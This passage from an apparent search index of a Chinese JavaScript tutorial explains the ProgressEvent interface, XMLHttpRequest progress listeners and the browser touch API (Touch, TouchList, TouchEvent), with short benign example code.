\uff1a\u6574\u6570\uff0c\u8868\u793a\u5df2\u7ecf\u52a0\u8f7d\u7684\u91cf\uff0c\u9ed8\u8ba4\u662f 0 \u3002 total \uff1a\u6574\u6570\uff0c\u8868\u793a\u9700\u8981\u52a0\u8f7d\u7684\u603b\u91cf\uff0c\u9ed8\u8ba4\u662f 0 \u3002 ProgressEvent \u5177\u6709\u5bf9\u5e94\u7684\u5b9e\u4f8b\u5c5e\u6027\u3002 ProgressEvent.lengthComputable ProgressEvent.loaded ProgressEvent.total \u5982\u679c ProgressEvent.lengthComputable \u4e3a false \uff0c ProgressEvent.total \u5b9e\u9645\u4e0a\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var p = new ProgressEvent ( 'load' , { lengthComputable : true , loaded : 30 , total : 100 , }); document . body . addEventListener ( 'load' , function ( e ) { console . log ( '\u5df2\u7ecf\u52a0\u8f7d\uff1a' + ( e . loaded / e . total ) * 100 + '%' ); }); document . body . dispatchEvent ( p ); // \u5df2\u7ecf\u52a0\u8f7d\uff1a30% \u4e0a\u9762\u4ee3\u7801\u5148\u6784\u9020\u4e00\u4e2a load \u4e8b\u4ef6\uff0c\u629b\u51fa\u540e\u88ab\u76d1\u542c\u51fd\u6570\u6355\u6349\u5230\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u5b9e\u9645\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 var xhr = new XMLHttpRequest (); xhr . addEventListener ( 'progress' , updateProgress , false ); xhr . addEventListener ( 'load' , transferComplete , false ); xhr . addEventListener ( 'error' , transferFailed , false ); xhr . addEventListener ( 'abort' , transferCanceled , false ); xhr . open (); function updateProgress ( e ) { if ( e . lengthComputable ) { var percentComplete = e . loaded / e . total ; } else { console . log ( '\u4e0d\u80fd\u8ba1\u7b97\u8fdb\u5ea6' ); } } function transferComplete ( e ) { console . log ( '\u4f20\u8f93\u7ed3\u675f' ); } function transferFailed ( evt ) { console . log ( '\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53d1\u751f\u9519\u8bef' ); } function transferCanceled ( evt ) { console . log ( '\u7528\u6237\u53d6\u6d88\u4e86\u4f20\u8f93' ); } \u4e0a\u9762\u662f\u4e0b\u8f7d\u8fc7\u7a0b\u7684\u8fdb\u5ea6\u4e8b\u4ef6\uff0c\u8fd8\u5b58\u5728\u4e0a\u4f20\u8fc7\u7a0b\u7684\u8fdb\u5ea6\u4e8b\u4ef6\u3002\u8fd9\u65f6\u6240\u6709\u76d1\u542c\u51fd\u6570\u90fd\u8981\u653e\u5728 XMLHttpRequest.upload \u5bf9\u8c61\u4e0a\u9762\u3002 1 2 3 4 5 6 7 8 var xhr = new XMLHttpRequest (); xhr . upload . addEventListener ( 'progress' , updateProgress , false ); xhr . upload . addEventListener ( 'load' , transferComplete , false ); xhr . upload . addEventListener ( 'error' , transferFailed , false ); xhr . upload . addEventListener ( 'abort' , transferCanceled , false ); xhr . open ();","title":"ProgressEvent \u63a5\u53e3"},{"location":"events/touch/","text":"\u89e6\u6478\u4e8b\u4ef6 \u00b6 \u89e6\u6478\u64cd\u4f5c\u6982\u8ff0 \u00b6 \u6d4f\u89c8\u5668\u7684\u89e6\u6478 API \u7531\u4e09\u4e2a\u90e8\u5206\u7ec4\u6210\u3002 Touch\uff1a\u4e00\u4e2a\u89e6\u6478\u70b9 TouchList\uff1a\u591a\u4e2a\u89e6\u6478\u70b9\u7684\u96c6\u5408 TouchEvent\uff1a\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\u5b9e\u4f8b Touch \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u7528\u6765\u8868\u793a\u89e6\u6478\u70b9\uff08\u4e00\u6839\u624b\u6307\u6216\u8005\u4e00\u6839\u89e6\u6478\u7b14\uff09\uff0c\u5305\u62ec\u4f4d\u7f6e\u3001\u5927\u5c0f\u3001\u5f62\u72b6\u3001\u538b\u529b\u3001\u76ee\u6807\u5143\u7d20\u7b49\u5c5e\u6027\u3002\u6709\u65f6\uff0c\u89e6\u6478\u52a8\u4f5c\u7531\u591a\u4e2a\u89e6\u6478\u70b9\uff08\u591a\u6839\u624b\u6307\uff09\u7ec4\u6210\uff0c\u591a\u4e2a\u89e6\u6478\u70b9\u7684\u96c6\u5408\u7531 TouchList \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u8868\u793a\u3002 TouchEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5bf9\u8c61\u4ee3\u8868\u7531\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\uff0c\u53ea\u6709\u89e6\u6478\u5c4f\u624d\u4f1a\u5f15\u53d1\u8fd9\u4e00\u7c7b\u4e8b\u4ef6\u3002 \u5f88\u591a\u65f6\u5019\uff0c\u89e6\u6478\u4e8b\u4ef6\u548c\u9f20\u6807\u4e8b\u4ef6\u540c\u65f6\u89e6\u53d1\uff0c\u5373\u4f7f\u8fd9\u4e2a\u65f6\u5019\u5e76\u6ca1\u6709\u7528\u5230\u9f20\u6807\u3002\u8fd9\u662f\u4e3a\u4e86\u8ba9\u90a3\u4e9b\u53ea\u5b9a\u4e49\u9f20\u6807\u4e8b\u4ef6\u3001\u6ca1\u6709\u5b9a\u4e49\u89e6\u6478\u4e8b\u4ef6\u7684\u4ee3\u7801\uff0c\u5728\u89e6\u6478\u5c4f\u7684\u60c5\u51b5\u4e0b\u4ecd\u7136\u80fd\u7528\u3002\u5982\u679c\u60f3\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u7528 event.preventDefault \u65b9\u6cd5\u963b\u6b62\u53d1\u51fa\u9f20\u6807\u4e8b\u4ef6\u3002 Touch \u63a5\u53e3 \u00b6 Touch \u63a5\u53e3\u6982\u8ff0 \u00b6 Touch \u63a5\u53e3\u4ee3\u8868\u5355\u4e2a\u89e6\u6478\u70b9\u3002\u89e6\u6478\u70b9\u53ef\u80fd\u662f\u4e00\u6839\u624b\u6307\uff0c\u4e5f\u53ef\u80fd\u662f\u4e00\u6839\u89e6\u6478\u7b14\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b Touch \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210 Touch \u5b9e\u4f8b\u3002 1 var touch = new Touch ( touchOptions ); Touch \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u5b83\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 identifier \uff1a\u5fc5\u9700\uff0c\u7c7b\u578b\u4e3a\u6574\u6570\uff0c\u8868\u793a\u89e6\u6478\u70b9\u7684\u552f\u4e00 ID\u3002 target \uff1a\u5fc5\u9700\uff0c\u7c7b\u578b\u4e3a\u5143\u7d20\u8282\u70b9\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5f00\u59cb\u65f6\u6240\u5728\u7684\u7f51\u9875\u5143\u7d20\u3002 clientX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 clientY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 screenX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 screenY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u8ddd\u79bb\uff0c\u9ed8\u8ba4\u4e3a0\u3002 pageX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u7f51\u9875\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5373\u5305\u62ec\u9875\u9762\u7684\u6eda\u52a8\u8ddd\u79bb\uff09\uff0c\u9ed8\u8ba4\u4e3a0\u3002 pageY \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u7f51\u9875\u5de6\u4e0a\u89d2\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5373\u5305\u62ec\u9875\u9762\u7684\u6eda\u52a8\u8ddd\u79bb\uff09\uff0c\u9ed8\u8ba4\u4e3a0\u3002 radiusX \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 X \u8f74\u534a\u5f84\uff0c\u9ed8\u8ba4\u4e3a0\u3002 radiusY \uff1a\u53ef\u9009\uff1a\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 Y \u8f74\u534a\u5f84\uff0c\u9ed8\u8ba4\u4e3a0\u3002 rotationAngle \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u533a\u57df\u7684\u692d\u5706\u7684\u65cb\u8f6c\u89d2\u5ea6\uff0c\u5355\u4f4d\u4e3a\u5ea6\u6570\uff0c\u57280\u523090\u5ea6\u4e4b\u95f4\uff0c\u9ed8\u8ba4\u503c\u4e3a0\u3002 force \uff1a\u53ef\u9009\uff0c\u7c7b\u578b\u4e3a\u6570\u503c\uff0c\u8303\u56f4\u5728 0 \u5230 1 \u4e4b\u95f4\uff0c\u8868\u793a\u89e6\u6478\u538b\u529b\u3002 0 \u4ee3\u8868\u6ca1\u6709\u538b\u529b\uff0c 1 \u4ee3\u8868\u786c\u4ef6\u6240\u80fd\u8bc6\u522b\u7684\u6700\u5927\u538b\u529b\uff0c\u9ed8\u8ba4\u4e3a 0 \u3002 Touch \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 \uff081\uff09Touch.identifier Touch.identifier \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u89e6\u6478\u70b9\u7684\u552f\u4e00 ID\u3002\u8fd9\u4e2a\u503c\u5728\u6574\u4e2a\u89e6\u6478\u8fc7\u7a0b\u4fdd\u6301\u4e0d\u53d8\uff0c\u76f4\u5230\u89e6\u6478\u4e8b\u4ef6\u7ed3\u675f\u3002 1 2 3 4 5 someElement . addEventListener ( 'touchmove' , function ( e ) { for ( var i = 0 ; i < e . changedTouches . length ; i ++ ) { console . log ( e . changedTouches [ i ]. identifier ); } }, false ); \uff082\uff09Touch.screenX\uff0cTouch.screenY\uff0cTouch.clientX\uff0cTouch.clientY\uff0cpageX\uff0cpageY Touch.screenX \u5c5e\u6027\u548c Touch.screenY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u4e0e\u9875\u9762\u662f\u5426\u6eda\u52a8\u65e0\u5173\u3002 Touch.clientX \u5c5e\u6027\u548c Touch.clientY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u89c6\u53e3\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u4e0e\u9875\u9762\u662f\u5426\u6eda\u52a8\u65e0\u5173\u3002 Touch.pageX \u5c5e\u6027\u548c Touch.pageY \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u89e6\u6478\u70b9\u76f8\u5bf9\u4e8e\u5f53\u524d\u9875\u9762\u5de6\u4e0a\u89d2\u7684\u6a2a\u5750\u6807\u548c\u7eb5\u5750\u6807\uff0c\u5305\u542b\u4e86\u9875\u9762\u6eda\u52a8\u5e26\u6765\u7684\u4f4d\u79fb\u3002 \uff083\uff09Touch.radiusX\uff0cTouch.radiusY\uff0cTouch.rotationAngle Touch.radiusX \u5c5e\u6027\u548c Touch.radiusY \u5c5e\u6027\uff0c\u5206\u522b\u8fd4\u56de\u89e6\u6478\u70b9\u5468\u56f4\u53d7\u5230\u5f71\u54cd\u7684\u692d\u5706\u8303\u56f4\u7684 X \u8f74\u534a\u5f84\u548c Y \u8f74\u534a\u5f84\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002\u4e58\u4ee5 2 \u5c31\u53ef\u4ee5\u5f97\u5230\u89e6\u6478\u8303\u56f4\u7684\u5bbd\u5ea6\u548c\u9ad8\u5ea6\u3002 Touch.rotationAngle \u5c5e\u6027\u8868\u793a\u89e6\u6478\u533a\u57df\u7684\u692d\u5706\u7684\u65cb\u8f6c\u89d2\u5ea6\uff0c\u5355\u4f4d\u4e3a\u5ea6\u6570\uff0c\u5728 0 \u5230 90 \u5ea6\u4e4b\u95f4\u3002 \u4e0a\u9762\u8fd9\u4e09\u4e2a\u5c5e\u6027\u5171\u540c\u5b9a\u4e49\u4e86\u7528\u6237\u4e0e\u5c4f\u5e55\u63a5\u89e6\u7684\u533a\u57df\uff0c\u5bf9\u4e8e\u63cf\u8ff0\u624b\u6307\u8fd9\u4e00\u7c7b\u975e\u7cbe\u786e\u7684\u89e6\u6478\uff0c\u5f88\u6709\u5e2e\u52a9\u3002\u6307\u5c16\u63a5\u89e6\u5c4f\u5e55\uff0c\u89e6\u6478\u8303\u56f4\u4f1a\u5f62\u6210\u4e00\u4e2a\u692d\u5706\uff0c\u8fd9\u4e09\u4e2a\u5c5e\u6027\u5c31\u7528\u6765\u63cf\u8ff0\u8fd9\u4e2a\u692d\u5706\u533a\u57df\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 div . addEventListener ( 'touchstart' , rotate ); div . addEventListener ( 'touchmove' , rotate ); div . addEventListener ( 'touchend' , rotate ); function rotate ( e ) { var touch = e . changedTouches . item ( 0 ); e . preventDefault (); src . style . width = touch . radiusX * 2 + 'px' ; src . style . height = touch . radiusY * 2 + 'px' ; src . style . transform = 'rotate(' + touch . rotationAngle + 'deg)' ; }; \uff084\uff09Touch.force Touch.force \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a 0 \u5230 1 \u4e4b\u95f4\u7684\u6570\u503c\uff0c\u8868\u793a\u89e6\u6478\u538b\u529b\u3002 0 \u4ee3\u8868\u6ca1\u6709\u538b\u529b\uff0c 1 \u4ee3\u8868\u786c\u4ef6\u6240\u80fd\u8bc6\u522b\u7684\u6700\u5927\u538b\u529b\u3002 \uff085\uff09Touch.target Touch.target \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5143\u7d20\u8282\u70b9\uff0c\u4ee3\u8868\u89e6\u6478\u53d1\u751f\u65f6\u6240\u5728\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002\u5373\u4f7f\u89e6\u6478\u70b9\u5df2\u7ecf\u79bb\u5f00\u4e86\u8fd9\u4e2a\u8282\u70b9\uff0c\u8be5\u5c5e\u6027\u4f9d\u7136\u4e0d\u53d8\u3002 TouchList \u63a5\u53e3 \u00b6 TouchList \u63a5\u53e3\u8868\u793a\u4e00\u7ec4\u89e6\u6478\u70b9\u7684\u96c6\u5408\u3002\u5b83\u7684\u5b9e\u4f8b\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f Touch \u7684\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u6240\u6709\u89e6\u6478\u70b9\u3002\u7528\u6237\u7528\u4e09\u6839\u624b\u6307\u89e6\u6478\uff0c\u4ea7\u751f\u7684 TouchList \u5b9e\u4f8b\u5c31\u4f1a\u5305\u542b\u4e09\u4e2a\u6210\u5458\uff0c\u6bcf\u6839\u624b\u6307\u7684\u89e6\u6478\u70b9\u5bf9\u5e94\u4e00\u4e2a Touch \u5b9e\u4f8b\u5bf9\u8c61\u3002 \u5b83\u7684\u5b9e\u4f8b\u4e3b\u8981\u901a\u8fc7\u89e6\u6478\u4e8b\u4ef6\u7684 TouchEvent.touches \u3001 TouchEvent.changedTouches \u3001 TouchEvent.targetTouches \u8fd9\u51e0\u4e2a\u5c5e\u6027\u83b7\u53d6\u3002 \u5b83\u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u5b9e\u4f8b\u65b9\u6cd5\u53ea\u6709\u4e24\u4e2a\u3002 TouchList.length \uff1a\u6570\u503c\uff0c\u8868\u793a\u6210\u5458\u6570\u91cf\uff08\u5373\u89e6\u6478\u70b9\u7684\u6570\u91cf\uff09\u3002 TouchList.item() \uff1a\u8fd4\u56de\u6307\u5b9a\u4f4d\u7f6e\u7684\u6210\u5458\uff0c\u5b83\u7684\u53c2\u6570\u662f\u8be5\u6210\u5458\u7684\u4f4d\u7f6e\u7f16\u53f7\uff08\u4ece\u96f6\u5f00\u59cb\uff09\u3002 TouchEvent \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 TouchEvent \u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u8868\u793a\u7531\u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\u5b9e\u4f8b\uff0c\u901a\u5e38\u6765\u81ea\u89e6\u6478\u5c4f\u6216\u8f68\u8ff9\u677f\u3002\u9664\u4e86\u88ab\u7ee7\u627f\u7684\u5c5e\u6027\u4ee5\u5916\uff0c\u5b83\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u5c5e\u6027\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b TouchEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u6765\u751f\u6210\u89e6\u6478\u4e8b\u4ef6\u7684\u5b9e\u4f8b\u3002 1 new TouchEvent ( type , options ) TouchEvent() \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u7c7b\u578b\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e8b\u4ef6\u7684\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u4e5f\u662f\u53ef\u9009\u7684\u3002\u9664\u4e86 Event \u63a5\u53e3\u7684\u914d\u7f6e\u5c5e\u6027\uff0c\u8be5\u63a5\u53e3\u8fd8\u6709\u4e00\u4e9b\u81ea\u5df1\u7684\u914d\u7f6e\u5c5e\u6027\u3002 touches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u6240\u6709\u7684\u5f53\u524d\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u7684\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 targetTouches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u6240\u6709\u5904\u5728\u89e6\u6478\u7684\u76ee\u6807\u5143\u7d20\u8282\u70b9\u5185\u90e8\u3001\u4e14\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u7684\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 changedTouches \uff1a TouchList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u672c\u6b21\u89e6\u6478\u4e8b\u4ef6\u7684\u76f8\u5173\u89e6\u6478\u70b9\uff0c\u9ed8\u8ba4\u503c\u662f\u4e00\u4e2a\u7a7a\u6570\u7ec4 [] \u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Ctrl \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Shift \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Alt \u952e\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a Meta \u952e\uff08\u6216 Windows \u952e\uff09\u662f\u5426\u540c\u65f6\u6309\u4e0b\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 \u5b9e\u4f8b\u5c5e\u6027 \u00b6 TouchEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5177\u6709 Event \u5b9e\u4f8b\u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u6b64\u5916\u8fd8\u6709\u4e00\u4e9b\u5b83\u81ea\u5df1\u7684\u5b9e\u4f8b\u5c5e\u6027\uff0c\u8fd9\u4e9b\u5c5e\u6027\u5168\u90e8\u90fd\u662f\u53ea\u8bfb\u3002 \uff081\uff09TouchEvent.altKey\uff0cTouchEvent.ctrlKey\uff0cTouchEvent.shiftKey\uff0cTouchEvent.metaKey TouchEvent.altKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Alt \u952e\u3002 TouchEvent.ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Ctrl \u952e\u3002 TouchEvent.shiftKey \uff1a\u5e03\u5c14\u503c\uff1a\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Shift \u952e\u3002 TouchEvent.metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u89e6\u6478\u65f6\u662f\u5426\u6309\u4e0b\u4e86 Meta \u952e\uff08\u6216 Windows \u952e\uff09\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 someElement . addEventListener ( 'touchstart' , function ( e ) { console . log ( 'altKey = ' + e . altKey ); console . log ( 'ctrlKey = ' + e . ctrlKey ); console . log ( 'metaKey = ' + e . metaKey ); console . log ( 'shiftKey = ' + e . shiftKey ); }, false ); \uff082\uff09TouchEvent.changedTouches TouchEvent.changedTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u4e00\u7ec4 Touch \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u8868\u793a\u672c\u6b21\u89e6\u6478\u4e8b\u4ef6\u7684\u76f8\u5173\u89e6\u6478\u70b9\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u65f6\u95f4\uff0c\u8be5\u5c5e\u6027\u7684\u542b\u4e49\u6709\u6240\u4e0d\u540c\u3002 touchstart \u4e8b\u4ef6\uff1a\u88ab\u6fc0\u6d3b\u7684\u89e6\u6478\u70b9 touchmove \u4e8b\u4ef6\uff1a\u53d1\u751f\u53d8\u5316\u7684\u89e6\u6478\u70b9 touchend \u4e8b\u4ef6\uff1a\u6d88\u5931\u7684\u89e6\u6478\u70b9\uff08\u5373\u4e0d\u518d\u88ab\u89e6\u78b0\u7684\u70b9\uff09 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 someElement . addEventListener ( 'touchmove' , function ( e ) { for ( var i = 0 ; i < e . changedTouches . length ; i ++ ) { console . log ( e . changedTouches [ i ]. identifier ); } }, false ); \uff083\uff09TouchEvent.touches TouchEvent.touches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u6240\u6709\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u89e6\u6478\u4e2d\uff09\u7684\u89e6\u6478\u70b9\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e2a\u624b\u6307\u5c31\u662f\u4e00\u4e2a\u89e6\u6478\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u793a\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 12 someElement . addEventListener ( 'touchstart' , function ( e ) { switch ( e . touches . length ) { // \u4e00\u6839\u624b\u6307\u89e6\u6478 case 1 : handle_one_touch ( e ); break ; // \u4e24\u6839\u624b\u6307\u89e6\u6478 case 2 : handle_two_touches ( e ); break ; // \u4e09\u6839\u624b\u6307\u89e6\u6478 case 3 : handle_three_touches ( e ); break ; // \u5176\u4ed6\u60c5\u51b5 default : console . log ( 'Not supported' ); break ; } }, false ); \uff084\uff09TouchEvent.targetTouches TouchEvent.targetTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u89e6\u6478\u4e8b\u4ef6\u7684\u76ee\u6807\u5143\u7d20\u8282\u70b9\u5185\u90e8\u3001\u6240\u6709\u4ecd\u7136\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\uff08\u5373\u89e6\u6478\u4e2d\uff09\u7684\u89e6\u6478\u70b9\u3002 1 2 3 function touches_in_target ( ev ) { return ( ev . touches . length === ev . targetTouches . length ? true : false ); } \u4e0a\u9762\u4ee3\u7801\u7528\u6765\u5224\u65ad\uff0c\u662f\u5426\u6240\u6709\u89e6\u6478\u70b9\u90fd\u5728\u76ee\u6807\u5143\u7d20\u5185\u3002 \u89e6\u6478\u4e8b\u4ef6\u7684\u79cd\u7c7b \u00b6 \u89e6\u6478\u5f15\u53d1\u7684\u4e8b\u4ef6\uff0c\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002\u53ef\u4ee5\u901a\u8fc7 TouchEvent.type \u5c5e\u6027\uff0c\u67e5\u770b\u5230\u5e95\u53d1\u751f\u7684\u662f\u54ea\u4e00\u79cd\u4e8b\u4ef6\u3002 touchstart \uff1a\u7528\u6237\u5f00\u59cb\u89e6\u6478\u65f6\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u8fd4\u56de\u53d1\u751f\u89e6\u6478\u7684\u5143\u7d20\u8282\u70b9\u3002 touchend \uff1a\u7528\u6237\u4e0d\u518d\u63a5\u89e6\u89e6\u6478\u5c4f\u65f6\uff08\u6216\u8005\u79fb\u51fa\u5c4f\u5e55\u8fb9\u7f18\u65f6\uff09\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u4e0e touchstart \u4e8b\u4ef6\u4e00\u81f4\u7684\uff0c\u5c31\u662f\u5f00\u59cb\u89e6\u6478\u65f6\u6240\u5728\u7684\u5143\u7d20\u8282\u70b9\u3002\u5b83\u7684 changedTouches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a TouchList \u5b9e\u4f8b\uff0c\u5305\u542b\u6240\u6709\u4e0d\u518d\u89e6\u6478\u7684\u89e6\u6478\u70b9\uff08\u5373 Touch \u5b9e\u4f8b\u5bf9\u8c61\uff09\u3002 touchmove \uff1a\u7528\u6237\u79fb\u52a8\u89e6\u6478\u70b9\u65f6\u89e6\u53d1\uff0c\u5b83\u7684 target \u5c5e\u6027\u4e0e touchstart \u4e8b\u4ef6\u4e00\u81f4\u3002\u5982\u679c\u89e6\u6478\u7684\u534a\u5f84\u3001\u89d2\u5ea6\u3001\u529b\u5ea6\u53d1\u751f\u53d8\u5316\uff0c\u4e5f\u4f1a\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002 touchcancel \uff1a\u89e6\u6478\u70b9\u53d6\u6d88\u65f6\u89e6\u53d1\uff0c\u6bd4\u5982\u5728\u89e6\u6478\u533a\u57df\u8df3\u51fa\u4e00\u4e2a\u6a21\u6001\u7a97\u53e3\uff08modal 